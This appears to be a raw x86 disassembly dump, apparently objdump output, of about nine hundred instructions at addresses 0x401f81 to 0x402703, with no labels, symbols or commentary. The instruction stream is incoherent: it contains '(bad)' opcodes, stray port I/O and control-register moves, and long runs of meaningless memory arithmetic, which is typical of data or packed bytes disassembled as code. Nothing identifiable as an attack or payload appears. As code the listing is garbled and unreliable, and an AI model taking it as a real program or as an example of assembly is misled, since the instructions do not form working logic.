  401f81:	add    BYTE PTR [edx],ah
  401f83:	and    esp,DWORD PTR [ecx+0x2]
  401f86:	rol    BYTE PTR [ebx+eiz*2],0x4
  401f8a:	inc    ecx
  401f8b:	or     BYTE PTR ds:0xa00486,al
  401f91:	lods   al,BYTE PTR ds:[esi]
  401f92:	add    BYTE PTR [eax],al
  401f94:	add    cl,0x20
  401f97:	and    al,0x0
  401f99:	inc    eax
  401f9a:	add    BYTE PTR [edx+ecx*1+0x20],0x14
  401f9f:	or     BYTE PTR [eax],bl
  401fa1:	add    BYTE PTR [eax],cl
  401fa3:	adc    BYTE PTR [eax],cl
  401fa5:	add    bh,bh
  401fa7:	adc    eax,0x4380f8
  401fac:	add    cl,BYTE PTR [eax+0x31]
  401faf:	push   ecx
  401fb0:	loop   0x401fb2
  401fb2:	(bad)  
  401fb3:	or     ah,BYTE PTR [eax+0x0]
  401fb6:	push   ss
  401fb7:	add    BYTE PTR [eax+eax*1+0x645d],al
  401fbe:	add    al,0xc9
  401fc0:	or     BYTE PTR [eax+0x0],cl
  401fc3:	add    ah,BYTE PTR [eax-0x8]
  401fc6:	sub    DWORD PTR [edx],esp
  401fc8:	add    BYTE PTR [ecx+0x209620c8],0x40
  401fcf:	or     BYTE PTR [eax],al
  401fd1:	or     BYTE PTR [edx],ah
  401fd3:	add    DWORD PTR [eax],esp
  401fd5:	add    al,0x69
  401fd7:	rol    BYTE PTR [esp+esi*2],0x44
  401fdb:	adc    eax,0x11164800
  401fe0:	adc    BYTE PTR [eax],0x9
  401fe3:	sub    al,0xc
  401fe5:	add    al,BYTE PTR [eax]
  401fe7:	inc    eax
  401fe8:	adc    DWORD PTR [eax],edx
  401fea:	add    BYTE PTR [eax+0x54],dh
  401fed:	adc    BYTE PTR [eax],ah
  401fef:	pusha  
  401ff0:	add    BYTE PTR [ebp-0x5c],ah
  401ff3:	and    BYTE PTR [ecx+0x48],al
  401ff6:	adc    al,0x0
  401ff8:	add    BYTE PTR [edx+eax*4],ah
  401ffb:	and    DWORD PTR [eax+0x660c0520],edx
  402001:	push   cs
  402002:	test   DWORD PTR [eax],eax
  402004:	adc    BYTE PTR [edi],ah
  402006:	add    al,BYTE PTR [eax-0x54]
  402009:	xor    al,0x22
  40200b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40200c:	bound  ebp,QWORD PTR [ecx]
  40200e:	add    BYTE PTR [esi],cl
  402010:	and    ah,BYTE PTR [ecx+0x20]
  402013:	or     BYTE PTR [eax+0x8],cl
  402016:	mov    eax,ds:0x9083444d
  40201b:	or     BYTE PTR [ecx],0x10
  40201e:	xor    DWORD PTR [eax+0x12],esp
  402021:	inc    esp
  402022:	add    BYTE PTR [esi],al
  402024:	add    al,0x8
  402027:	xchg   ecx,eax
  402028:	add    DWORD PTR ds:0x20042913,ecx
  40202e:	jo     0x402031
  402030:	dec    eax
  402031:	adc    cl,BYTE PTR [esp+ebp*2]
  402034:	or     BYTE PTR [eax],bl
  402036:	adc    BYTE PTR [ecx-0x7c],dh
  402039:	fadd   DWORD PTR [esi+0x9]
  40203c:	fnstsw ax
  40203e:	or     eax,DWORD PTR [eax+eiz*8]
  402041:	sub    BYTE PTR [edx],al
  402043:	inc    esp
  402044:	popa   
  402045:	and    BYTE PTR [eax],cl
  402047:	sub    BYTE PTR [eax],cl
  402049:	add    eax,DWORD PTR [eax]
  40204b:	adc    BYTE PTR [esi-0x30],ah
  40204e:	sub    dl,BYTE PTR [edx]
  402050:	add    dl,BYTE PTR [eax]
  402052:	add    DWORD PTR [edx],ebx
  402054:	adc    BYTE PTR [ecx+0x40058414],al
  40205a:	sbb    BYTE PTR [ecx-0x7fff2600],0x4
  402061:	add    eax,DWORD PTR [ebp+eax*2+0x61200206]
  402068:	inc    ebp
  402069:	adc    BYTE PTR [eax+0x1],0x1
  40206d:	rcl    BYTE PTR [eax+0x5],0x10
  402071:	inc    ebp
  402072:	or     BYTE PTR [eax],al
  402074:	add    BYTE PTR [eax+0x19],0x0
  402078:	mov    dl,0x24
  40207a:	dec    esp
  40207b:	xchg   edi,eax
  40207c:	inc    ebx
  40207d:	add    BYTE PTR [edx],al
  40207f:	add    BYTE PTR [edx],ah
  402081:	and    BYTE PTR [eax+0x12106128],al
  402087:	les    edx,FWORD PTR [edi]
  402089:	rol    BYTE PTR [ecx+ecx*1+0x2010906],0x32
  402091:	nop
  402092:	xchg   ecx,eax
  402093:	mov    esp,cr1
  402096:	add    DWORD PTR ds:0x1200032,eax
  40209c:	add    BYTE PTR [eax],al
  40209e:	sub    ah,dh
  4020a0:	test   BYTE PTR [edx+esi*8-0x516fabb9],al
  4020a7:	or     al,0x46
  4020a9:	mov    al,0x10
  4020ab:	mov    BYTE PTR [edx],cl
  4020ad:	push   eax
  4020ae:	test   BYTE PTR [eax],dl
  4020b0:	inc    ebx
  4020b1:	push   cs
  4020b2:	push   0xb002640
  4020b7:	and    BYTE PTR [eax+0x428c5835],al
  4020bd:	sub    BYTE PTR [ebx+0x30],bl
  4020c0:	adc    BYTE PTR [edx+0x10208084],cl
  4020c6:	mov    WORD PTR [edx],es
  4020c8:	or     BYTE PTR [edx+0x4a],al
  4020cb:	inc    esp
  4020cc:	inc    eax
  4020cd:	and    DWORD PTR [eax],0x94405980
  4020d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d4:	adc    BYTE PTR [eax],dl
  4020d6:	rol    BYTE PTR [eax+ecx*2+0xc],0x11
  4020db:	add    BYTE PTR [edx-0x36],al
  4020de:	xchg   BYTE PTR [eax+0x4],dl
  4020e1:	in     eax,0xa3
  4020e3:	mov    ah,0x1
  4020e5:	add    BYTE PTR [eax+0x0],al
  4020e8:	push   eax
  4020e9:	and    al,0xa0
  4020eb:	and    al,0x84
  4020ed:	mov    BYTE PTR [eax],dl
  4020ef:	pop    ecx
  4020f0:	add    al,BYTE PTR [eax+eax*1-0x7a]
  4020f4:	inc    eax
  4020f5:	sub    BYTE PTR [eax],ah
  4020f7:	add    BYTE PTR [eax+0xc],ah
  4020fa:	inc    eax
  4020fb:	add    BYTE PTR [eax],al
  4020fd:	add    al,0x10
  4020ff:	add    BYTE PTR [ecx-0x7fd46000],cl
  402105:	push   ebx
  402106:	adc    al,0x1
  402108:	adc    eax,DWORD PTR [eax]
  40210a:	or     DWORD PTR [ecx],ecx
  40210c:	popa   
  40210d:	xor    al,0x14
  40210f:	inc    eax
  402110:	dec    eax
  402111:	xor    BYTE PTR [ecx+eax*1],bh
  402114:	push   ecx
  402115:	inc    esi
  402116:	add    DWORD PTR [edx],ebx
  402118:	inc    ecx
  402119:	add    BYTE PTR [ecx],bl
  40211b:	dec    eax
  40211c:	mov    eax,ds:0x3e002404
  402121:	test   eax,0x526c810d
  402126:	adc    DWORD PTR [eax],edx
  402128:	add    al,0x40
  40212a:	push   0x0
  40212c:	add    al,BYTE PTR [eax]
  40212e:	sub    BYTE PTR [edx+0x24],al
  402131:	aam    0x10
  402133:	add    BYTE PTR [esp+ecx*2],0x92
  402137:	add    BYTE PTR [eax],al
  402139:	inc    edx
  40213a:	or     BYTE PTR [eax],al
  40213c:	test   al,0xe0
  40213e:	in     al,dx
  40213f:	inc    ebp
  402140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402141:	mov    WORD PTR [edx],es
  402143:	and    eax,DWORD PTR [eax]
  402145:	adc    ah,BYTE PTR [eax+eax*1+0xc]
  402149:	add    DWORD PTR [eax],0x4055180c
  40214f:	push   es
  402150:	xor    cl,BYTE PTR [eax]
  402152:	add    dh,BYTE PTR [eax]
  402154:	and    BYTE PTR [eax],bl
  402156:	add    BYTE PTR [eax+eax*1],ah
  402159:	add    al,0x5b
  40215b:	add    BYTE PTR [esp+eax*2+0xc810c09],al
  402162:	out    0x4,eax
  402164:	add    ah,BYTE PTR [esi-0x5e]
  402167:	cwde   
  402168:	add    DWORD PTR [eax-0x80],eax
  40216b:	add    BYTE PTR [eax],cl
  40216d:	adc    dl,BYTE PTR [edx+0x1500430c]
  402173:	mov    ds:0x1000c008,al
  402178:	add    BYTE PTR [eax],ah
  40217a:	xchg   ebx,eax
  40217b:	cs add eax,0x480353
  402181:	ror    DWORD PTR [eax],0x0
  402184:	add    DWORD PTR [eax+eax*1],0x14c42208
  40218b:	and    DWORD PTR [edx],eax
  40218d:	inc    ecx
  40218e:	add    BYTE PTR fs:[eax+ecx*8+0x42022315],al
  402196:	(bad)  
  402197:	and    cl,BYTE PTR [edx+0x31582141]
  40219d:	or     BYTE PTR [eax+0xc800112],al
  4021a3:	add    BYTE PTR [eax],dl
  4021a5:	add    eax,DWORD PTR [eax]
  4021a7:	dec    edx
  4021a8:	or     BYTE PTR [ecx],al
  4021aa:	add    BYTE PTR [eax+0x21],al
  4021ad:	push   0x681008
  4021b2:	add    eax,0x10210442
  4021b7:	and    al,BYTE PTR [esi+0x20]
  4021ba:	nop
  4021bb:	inc    ecx
  4021bc:	inc    esp
  4021bd:	add    BYTE PTR [edx+0x2c],0xc1
  4021c1:	xchg   esp,eax
  4021c2:	inc    eax
  4021c3:	and    BYTE PTR [edx-0x7e],dh
  4021c6:	and    BYTE PTR ds:0x10022000,0x5a
  4021cd:	stos   DWORD PTR es:[edi],eax
  4021ce:	out    0x96,al
  4021d0:	aaa    
  4021d1:	cmp    BYTE PTR [eax],dl
  4021d3:	inc    eax
  4021d4:	add    BYTE PTR [edx],dl
  4021d6:	add    BYTE PTR [ecx+0x1422c040],ah
  4021dc:	add    al,0xe1
  4021de:	add    BYTE PTR [ebx],dh
  4021e0:	add    DWORD PTR [eax-0x4c],eax
  4021e3:	mov    edx,0x20054b
  4021e8:	and    BYTE PTR [eax+0x24],al
  4021eb:	adc    BYTE PTR [eax],al
  4021ed:	add    DWORD PTR [ecx],esp
  4021ef:	add    al,0x3c
  4021f1:	add    BYTE PTR [ecx+0x20],al
  4021f4:	adc    DWORD PTR [esi-0x6f6fd7c0],0x0
  4021fb:	push   esp
  4021fc:	and    cl,BYTE PTR [edi+eax*1+0x20]
  402200:	pusha  
  402201:	and    BYTE PTR [edx-0x47],al
  402204:	and    BYTE PTR [ebx],0x11
  402207:	test   BYTE PTR [edx+ebx*1+0x54b00001],dl
  40220e:	adc    al,0x24
  402210:	add    BYTE PTR [eax],dl
  402212:	and    ah,BYTE PTR [ecx]
  402214:	pop    ss
  402215:	xor    DWORD PTR [eax],esi
  402217:	or     DWORD PTR [edx],0x10
  40221a:	stos   BYTE PTR es:[edi],al
  40221b:	cs test al,0x8
  40221e:	sub    BYTE PTR [eax],dl
  402220:	inc    edx
  402221:	sub    dh,BYTE PTR [edx]
  402223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402224:	int3   
  402225:	mov    al,ds:0xa0800110
  40222a:	and    BYTE PTR [ecx],al
  40222c:	xor    BYTE PTR [edx-0x7ffbdfde],al
  402232:	adc    cl,BYTE PTR [eax+0x42]
  402235:	add    DWORD PTR [eax],edx
  402237:	adc    BYTE PTR [ebx],dl
  402239:	sbb    al,0x41
  40223b:	adc    DWORD PTR [ecx+eax*1],esi
  40223e:	js     0x402279
  402240:	inc    ecx
  402241:	add    dh,BYTE PTR [eax+edx*1]
  402244:	inc    eax
  402245:	add    DWORD PTR [ecx],edx
  402247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402248:	add    BYTE PTR [ecx],dl
  40224a:	and    al,dh
  40224c:	mov    eax,ds:0x20018100
  402251:	sbb    BYTE PTR [eax],ah
  402253:	and    BYTE PTR [esi],al
  402255:	xchg   esp,eax
  402256:	pop    ecx
  402257:	mov    edx,DWORD PTR [eax]
  402259:	adc    BYTE PTR [eax+0x1e],dl
  40225c:	add    al,0x60
  40225e:	add    DWORD PTR [edx+0x3],eax
  402261:	xchg   BYTE PTR [eax+eax*1-0x7c],al
  402265:	add    al,0x40
  402267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402268:	add    ah,BYTE PTR [edx]
  40226a:	mov    BYTE PTR [eax+0x49047320],ch
  402270:	add    DWORD PTR [esi+eiz*1-0x3cb5eeda],0x88354300
  40227b:	add    eax,0x1880022
  402280:	and    al,0x0
  402282:	push   edx
  402283:	or     al,0x80
  402285:	push   eax
  402286:	inc    edx
  402287:	sbb    esp,DWORD PTR [edx+0x408e8871]
  40228d:	xor    al,BYTE PTR [ebx-0x6e5faff8]
  402293:	add    al,0x8
  402295:	or     al,0x18
  402297:	xor    eax,DWORD PTR [eax+0x0]
  40229a:	inc    esp
  40229b:	dec    eax
  40229c:	xor    DWORD PTR [eax],eax
  40229e:	nop
  40229f:	add    BYTE PTR [edx],al
  4022a1:	and    al,BYTE PTR [edx]
  4022a3:	dec    eax
  4022a4:	and    BYTE PTR [eax],cl
  4022a6:	fdiv   DWORD PTR [eax+0x8]
  4022a9:	dec    eax
  4022aa:	pop    eax
  4022ab:	inc    eax
  4022ac:	add    BYTE PTR [eax],ch
  4022ae:	add    BYTE PTR [ecx+ecx*2],dl
  4022b1:	add    cl,BYTE PTR [esi+esi*1+0x40]
  4022b5:	add    BYTE PTR [eax+0x24],al
  4022b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022b9:	or     DWORD PTR [eax],eax
  4022bb:	xchg   DWORD PTR [ebx],edx
  4022bd:	xchg   esp,eax
  4022be:	nop
  4022bf:	test   DWORD PTR [esp+eax*2],esp
  4022c2:	add    al,BYTE PTR [eax+0x4c02809]
  4022c8:	push   es
  4022c9:	xchg   ebx,eax
  4022ca:	dec    edx
  4022cb:	and    BYTE PTR [eax],al
  4022cd:	inc    ebx
  4022ce:	inc    eax
  4022cf:	or     al,0x12
  4022d1:	pop    es
  4022d2:	add    BYTE PTR [eax],dl
  4022d4:	sub    DWORD PTR [eax],edi
  4022d6:	cmp    BYTE PTR [ebx+eax*1],dl
  4022d9:	add    DWORD PTR [eax+eax*4-0x77d6ffe0],eax
  4022e0:	pusha  
  4022e1:	sub    al,0x0
  4022e3:	mov    BYTE PTR [eax],dh
  4022e5:	add    BYTE PTR [eax],ah
  4022e7:	cdq    
  4022e8:	inc    ecx
  4022e9:	adc    DWORD PTR [eax],eax
  4022eb:	inc    eax
  4022ec:	inc    eax
  4022ed:	add    al,0x48
  4022ef:	or     bl,BYTE PTR [ebp+0x12000e2]
  4022f5:	add    al,0x6c
  4022f7:	push   0x64a1880
  4022fc:	pusha  
  4022fd:	and    BYTE PTR [eax],dl
  4022ff:	or     BYTE PTR [ecx],al
  402301:	push   cs
  402302:	or     BYTE PTR [ebx+0x8641002],al
  402308:	pop    ebx
  402309:	add    DWORD PTR [esi],eax
  40230b:	add    al,0x81
  40230d:	add    BYTE PTR [eax],dl
  40230f:	mov    al,es:0x41062748
  402315:	dec    edx
  402316:	add    al,0x3
  402318:	nop
  402319:	add    eax,ebp
  40231b:	add    BYTE PTR [ecx+0x10044820],bl
  402321:	sub    al,0x20
  402323:	xor    BYTE PTR [eax],0x1
  402326:	test   al,0x21
  402328:	add    al,0x4
  40232a:	sub    dl,BYTE PTR [ecx]
  40232c:	inc    esi
  40232d:	add    BYTE PTR [ebx],al
  40232f:	add    dl,al
  402331:	and    BYTE PTR [eax],dl
  402333:	inc    edx
  402334:	add    edx,ecx
  402336:	add    BYTE PTR [ecx],cl
  402338:	add    dl,BYTE PTR [eax]
  40233a:	add    BYTE PTR [eiz*1-0x3afedde0],dl
  402341:	adc    edx,DWORD PTR [eax+eax*2]
  402344:	xchg   BYTE PTR [eax],al
  402346:	push   es
  402347:	push   ss
  402348:	mov    eax,ds:0xb11027a8
  40234d:	dec    eax
  40234e:	mov    dl,ah
  402350:	adc    BYTE PTR [eax],0x80
  402353:	add    BYTE PTR [eax+0x50610108],0x0
  40235a:	inc    ecx
  40235b:	add    BYTE PTR [eax],cl
  40235d:	pop    ss
  40235e:	and    cl,BYTE PTR [eax]
  402360:	push   es
  402361:	js     0x402373
  402363:	test   al,0x28
  402365:	and    cl,BYTE PTR [eax]
  402367:	test   BYTE PTR [eax],bl
  402369:	add    dl,al
  40236b:	adc    BYTE PTR ds:0x9000b400,al
  402371:	or     al,BYTE PTR [edx]
  402373:	add    eax,0x9504809
  402378:	adc    BYTE PTR [eax],al
  40237a:	dec    eax
  40237b:	push   ebx
  40237c:	mov    ds:0x82043000,al
  402381:	adc    al,BYTE PTR [eax]
  402383:	add    al,BYTE PTR [edx]
  402385:	or     BYTE PTR [edx],dl
  402387:	adc    ecx,DWORD PTR [eax]
  402389:	xor    eax,0xa440040
  40238e:	add    al,0x29
  402390:	and    eax,0x8585202c
  402395:	scas   al,BYTE PTR es:[edi]
  402396:	adc    cl,BYTE PTR [eax]
  402398:	rol    BYTE PTR [eax+eax*4],1
  40239b:	inc    esi
  40239c:	xor    cl,BYTE PTR [edx+eax*2]
  40239f:	mov    WORD PTR [ebp+0x72],es
  4023a2:	mov    ds:0x402010b6,al
  4023a7:	and    BYTE PTR [eax],dl
  4023a9:	jo     0x4023bb
  4023ab:	mov    WORD PTR [ecx+0x6c8010],cs
  4023b1:	or     al,0x2c
  4023b3:	add    al,0x85
  4023b5:	xor    DWORD PTR [eax],esp
  4023b7:	push   ds
  4023b8:	and    BYTE PTR [eax],ah
  4023ba:	test   DWORD PTR [eax+eax*1+0x4010ab05],eax
  4023c1:	adc    al,0x0
  4023c3:	and    BYTE PTR [ebx],al
  4023c5:	inc    edx
  4023c6:	inc    eax
  4023c7:	xchg   esi,eax
  4023c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c9:	rcl    DWORD PTR [ecx+0x64000000],1
  4023cf:	or     DWORD PTR [esi+eiz*4+0x28],edx
  4023d3:	and    al,0x42
  4023d5:	and    BYTE PTR [eax+0x8249052],al
  4023db:	push   0x6408052
  4023e0:	dec    eax
  4023e1:	and    BYTE PTR [eax+0x68],0x0
  4023e5:	pop    ss
  4023e6:	mov    DWORD PTR [eax],ecx
  4023e8:	add    al,0x1b
  4023ea:	rol    DWORD PTR [eax-0x40],1
  4023ed:	add    al,BYTE PTR [eax]
  4023ef:	adc    BYTE PTR [edi],cl
  4023f1:	sar    BYTE PTR [eax+0x40],cl
  4023f4:	add    dl,BYTE PTR [eax]
  4023f6:	add    BYTE PTR [edx],0x20
  4023f9:	add    BYTE PTR [eax+0x43],cl
  4023fc:	xchg   esp,eax
  4023fd:	mov    BYTE PTR [edi+0x68800230],dl
  402403:	push   esi
  402404:	inc    eax
  402405:	adc    eax,DWORD PTR [ecx+0x10a62c2b]
  40240b:	test   eax,0x907518a0
  402410:	and    BYTE PTR [ecx],0x54
  402413:	inc    eax
  402414:	adc    al,0x8e
  402416:	adc    DWORD PTR [edi+eax*1],eax
  402419:	add    ah,0x0
  40241c:	mov    eax,DWORD PTR [eax]
  40241e:	add    DWORD PTR [edx],ecx
  402420:	inc    eax
  402421:	int3   
  402422:	add    al,BYTE PTR [eax-0x78]
  402425:	dec    esp
  402426:	daa    
  402427:	add    eax,DWORD PTR [eax+ebp*4]
  40242a:	and    BYTE PTR [ebx-0x75fbfbaf],0x22
  402431:	sub    al,0x80
  402433:	daa    
  402434:	popa   
  402435:	add    eax,0x1051048d
  40243a:	add    al,0x2
  40243c:	add    BYTE PTR [eax],al
  40243e:	and    BYTE PTR [edi],al
  402440:	and    BYTE PTR [eax+ebx*2+0x19],cl
  402444:	adc    BYTE PTR [edi+eax*1],al
  402447:	adc    DWORD PTR [eax],edx
  402449:	add    BYTE PTR [eax-0x6e],0x40
  40244d:	test   al,0x4
  40244f:	pushf  
  402450:	add    ah,BYTE PTR [eax+0x7010a02]
  402456:	add    BYTE PTR [edx],al
  402458:	add    BYTE PTR [ebx+edx*1],al
  40245b:	adc    eax,0xa2114a24
  402460:	sbb    al,BYTE PTR [eax]
  402462:	adc    al,0x82
  402464:	add    al,0x8
  402466:	test   al,0x2
  402468:	add    DWORD PTR [eax+ecx*1],ecx
  40246b:	xchg   BYTE PTR [esi],al
  40246d:	adc    BYTE PTR [eax],dl
  40246f:	inc    edx
  402470:	inc    eax
  402471:	mov    dl,0x20
  402473:	add    BYTE PTR [esi+eax*1],al
  402476:	add    BYTE PTR [eax],cl
  402478:	inc    esp
  402479:	inc    ebx
  40247a:	add    dl,BYTE PTR [eax]
  40247c:	mov    al,0x1
  40247e:	push   ss
  40247f:	add    BYTE PTR [ecx],al
  402481:	adc    dh,BYTE PTR [ecx]
  402483:	adc    BYTE PTR [ebp-0x3d],dh
  402486:	xor    BYTE PTR [eax],dl
  402488:	xor    al,0x10
  40248a:	mov    al,0x23
  40248c:	sub    eax,0x1033080
  402491:	inc    eax
  402492:	push   es
  402493:	jo     0x4024a7
  402495:	add    BYTE PTR [eax-0x7effeff5],ah
  40249b:	add    BYTE PTR [eax],0x90
  40249e:	sbb    DWORD PTR [eax],eax
  4024a0:	add    cl,dl
  4024a2:	and    al,0x29
  4024a4:	and    ah,BYTE PTR [eax]
  4024a6:	(bad)  
  4024a7:	xor    BYTE PTR [eax],al
  4024a9:	add    edx,DWORD PTR [eax]
  4024ab:	push   0xa8da0515
  4024b0:	add    BYTE PTR [esi],ah
  4024b2:	add    al,0x0
  4024b4:	add    BYTE PTR [edi+0x6141848a],0xda
  4024bb:	test   BYTE PTR [esi*4-0x6ffe7f4f],al
  4024c2:	and    BYTE PTR [eax],al
  4024c4:	push   ds
  4024c5:	add    DWORD PTR [edx],eax
  4024c7:	add    al,BYTE PTR [eax]
  4024c9:	and    ch,BYTE PTR [edx+0x30110030]
  4024cf:	and    BYTE PTR [eax+0x4228002],ah
  4024d5:	and    DWORD PTR [ecx+0x10],edx
  4024d8:	add    ah,BYTE PTR [eax+0x44]
  4024db:	nop
  4024dc:	xchg   ebx,eax
  4024dd:	or     dl,BYTE PTR [edx+0x62]
  4024e0:	or     DWORD PTR [eax-0x7aafbee0],0x26389a36
  4024ea:	push   ss
  4024eb:	push   eax
  4024ec:	inc    ebp
  4024ed:	pop    ebx
  4024ee:	dec    eax
  4024ef:	adc    al,BYTE PTR [edx+0x931011]
  4024f5:	add    DWORD PTR [ecx+0x3aa013f],0x86c05a82
  4024ff:	sub    al,dh
  402501:	add    BYTE PTR [edx],al
  402503:	into   
  402504:	and    DWORD PTR [esi+eiz*1+0x5e],esi
  402508:	add    al,0x54
  40250a:	inc    edx
  40250b:	mov    BYTE PTR cs:[edx-0x70],cl
  40250f:	add    BYTE PTR [edx+0x20a54024],al
  402515:	or     al,0x62
  402517:	loopne 0x40257f
  402519:	add    al,BYTE PTR [ebx]
  40251b:	adc    BYTE PTR [esi+eax*8-0x70],dl
  40251f:	ins    DWORD PTR es:[edi],dx
  402520:	inc    ecx
  402521:	ror    BYTE PTR [edx+0x10],0xa
  402525:	sub    DWORD PTR [eax],esi
  402527:	push   edx
  402528:	and    al,0x10
  40252a:	adc    BYTE PTR [ecx-0x10],al
  40252d:	mov    al,ds:0x4c20a891
  402532:	add    al,BYTE PTR [ecx]
  402534:	adc    al,BYTE PTR [edx+0x44142e2d]
  40253a:	add    eax,0xa4014608
  40253f:	and    al,0x82
  402541:	add    BYTE PTR [eax],cl
  402543:	add    BYTE PTR [esp+0x24844384],al
  40254a:	add    BYTE PTR [eax],al
  40254c:	adc    BYTE PTR [eax+0x2],al
  40254f:	add    DWORD PTR [ecx+edx*2],0xc00541c0
  402556:	or     BYTE PTR [ecx],bh
  402558:	xchg   edi,eax
  402559:	mov    eax,0x21108043
  40255e:	add    ah,BYTE PTR [ebx]
  402560:	xor    al,0x22
  402562:	mov    BYTE PTR [eax],dl
  402564:	mov    al,ds:0x60312e01
  402569:	adc    DWORD PTR [edx],esp
  40256b:	or     BYTE PTR [ebx+edx*4+0x40233030],bl
  402572:	add    dl,BYTE PTR [edx+0x60401282]
  402578:	test   BYTE PTR [ecx+0x18580204],al
  40257e:	add    BYTE PTR [eax+0x60008842],al
  402584:	test   DWORD PTR [eax-0x70],edx
  402587:	loop   0x402589
  402589:	and    BYTE PTR [eax],al
  40258b:	add    dl,BYTE PTR [eax+eax*1]
  40258e:	xchg   esp,eax
  40258f:	and    eax,0x21000f01
  402594:	add    BYTE PTR [eax],bh
  402596:	inc    edx
  402597:	dec    eax
  402598:	push   ss
  402599:	and    BYTE PTR [eax],cl
  40259b:	dec    eax
  40259c:	adc    BYTE PTR [ecx],al
  40259e:	inc    ecx
  40259f:	daa    
  4025a0:	push   ss
  4025a1:	test   al,0x36
  4025a3:	sub    al,0xa0
  4025a5:	pusha  
  4025a6:	shr    BYTE PTR [eax+0x70481044],cl
  4025ac:	iret   
  4025ad:	dec    edx
  4025ae:	add    DWORD PTR [eax+0x24],edx
  4025b1:	sub    BYTE PTR [eax+eiz*2-0x2a1ffe46],al
  4025b8:	adc    BYTE PTR [ecx],dh
  4025ba:	sub    BYTE PTR [ecx+0x48],bl
  4025bd:	add    al,BYTE PTR [eax+0x5040509]
  4025c3:	loopne 0x4025df
  4025c5:	push   edx
  4025c6:	ret    
  4025c7:	add    BYTE PTR [edx],al
  4025c9:	add    ah,al
  4025cb:	mov    ah,0xa0
  4025cd:	or     BYTE PTR [esi+0x1d41260],0x40
  4025d4:	inc    edx
  4025d5:	push   edx
  4025d6:	cdq    
  4025d7:	or     DWORD PTR [edx+0x0],edx
  4025da:	adc    BYTE PTR [eax],al
  4025dc:	ss inc eax
  4025de:	ins    BYTE PTR es:[edi],dx
  4025df:	and    ah,BYTE PTR [eax+eax*8]
  4025e2:	add    dl,BYTE PTR [edx+0x414918b]
  4025e8:	add    dl,BYTE PTR [ecx]
  4025ea:	or     BYTE PTR [eax],dl
  4025ec:	add    BYTE PTR [eax+eiz*1+0x2],al
  4025f0:	inc    ebp
  4025f1:	add    BYTE PTR [ecx],dl
  4025f3:	or     al,0x32
  4025f5:	pop    ss
  4025f6:	inc    ebx
  4025f7:	add    BYTE PTR [eax+0x24d40222],ah
  4025fd:	and    BYTE PTR [edx],dh
  4025ff:	add    BYTE PTR [eax],al
  402601:	addr16 add esp,esp
  402604:	mov    cl,0x40
  402606:	add    BYTE PTR [eax],dl
  402608:	add    DWORD PTR [ecx+0x20],edi
  40260b:	push   edx
  40260c:	inc    eax
  40260d:	inc    eax
  40260e:	es inc esp
  402610:	and    BYTE PTR [eax-0x7ffdf75c],al
  402616:	sbb    al,al
  402618:	mov    BYTE PTR [eax+0x3018005],al
  40261e:	and    eax,0xa63420
  402623:	or     BYTE PTR [ecx+0x19],0x18
  402627:	pop    eax
  402628:	adc    eax,0x881a402
  40262d:	mov    ds:0xd0081a07,eax
  402632:	pop    es
  402633:	xor    eax,DWORD PTR [eax+0x6120c14]
  402639:	add    DWORD PTR [eax+0x1248c80],eax
  40263f:	push   0x88a00c
  402644:	add    BYTE PTR [esp+edx*2+0x74],al
  402648:	push   ecx
  402649:	sub    BYTE PTR [eax],al
  40264b:	test   BYTE PTR [eax],al
  40264d:	add    eax,DWORD PTR [eax]
  40264f:	dec    eax
  402650:	push   0x1
  402652:	push   eax
  402653:	nop
  402654:	add    BYTE PTR [eax+eax*2+0x40002228],al
  40265b:	adc    BYTE PTR [eax],ah
  40265d:	add    BYTE PTR [eax],0x82
  402660:	cwde   
  402661:	adc    BYTE PTR [eax],dl
  402663:	test   BYTE PTR [eax],al
  402665:	xor    eax,DWORD PTR [eax+ebx*1]
  402668:	and    dh,BYTE PTR fs:[ecx+0x0]
  40266c:	xor    BYTE PTR [eax+0x8000ea4],al
  402672:	inc    eax
  402673:	adc    BYTE PTR [ecx+0x2],al
  402676:	or     DWORD PTR [eax+eax*1],eax
  402679:	or     DWORD PTR [eax],ecx
  40267b:	ds adc al,0x9e
  40267e:	cwde   
  40267f:	inc    edx
  402680:	dec    ecx
  402681:	or     eax,0x22188300
  402686:	inc    esp
  402687:	inc    ecx
  402688:	rol    DWORD PTR [ebp+0x1108006],cl
  40268e:	cdq    
  40268f:	inc    eax
  402690:	rol    DWORD PTR [edx+0x43ce2808],0x18
  402697:	inc    eax
  402698:	jo     0x40269c
  40269a:	or     al,0x0
  40269c:	mov    ecx,0x29238c41
  4026a1:	and    al,ah
  4026a3:	sbb    BYTE PTR [ebp*4+0x240c8],ah
  4026aa:	add    al,0x80
  4026ac:	adc    BYTE PTR [eax],ah
  4026ae:	sub    BYTE PTR [eax+0x50000004],al
  4026b4:	add    al,0x30
  4026b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026b7:	dec    eax
  4026b8:	test   eax,0x90100000
  4026bd:	inc    eax
  4026be:	add    esp,eax
  4026c0:	add    ebx,edx
  4026c2:	push   0x509a51
  4026c7:	rol    BYTE PTR [eax+eax*4],0x3c
  4026cb:	cwde   
  4026cc:	add    eax,eax
  4026ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026cf:	inc    edx
  4026d0:	and    BYTE PTR ds:0x48a80081,al
  4026d6:	xchg   esp,eax
  4026d7:	add    al,0x22
  4026d9:	xor    dl,BYTE PTR [edx]
  4026db:	fwait
  4026dc:	nop
  4026dd:	inc    ebp
  4026de:	sbb    DWORD PTR [ecx+0x1024aa43],eax
  4026e4:	sbb    dh,BYTE PTR [ecx]
  4026e6:	add    al,0x90
  4026e8:	add    cl,BYTE PTR [eax+0x12]
  4026eb:	sbb    BYTE PTR [eax],al
  4026ed:	and    BYTE PTR [edx],al
  4026ef:	and    eax,DWORD PTR [ebx]
  4026f1:	dec    eax
  4026f2:	inc    ebp
  4026f3:	inc    esp
  4026f4:	inc    esp
  4026f5:	dec    eax
  4026f6:	add    al,BYTE PTR [eax+ecx*1-0x3c]
  4026fa:	nop
  4026fb:	push   ss
  4026fc:	xchg   esp,eax
  4026fd:	inc    ebx
  4026fe:	add    eax,0x2611a48c
  402703:	test   eax,0x14210041
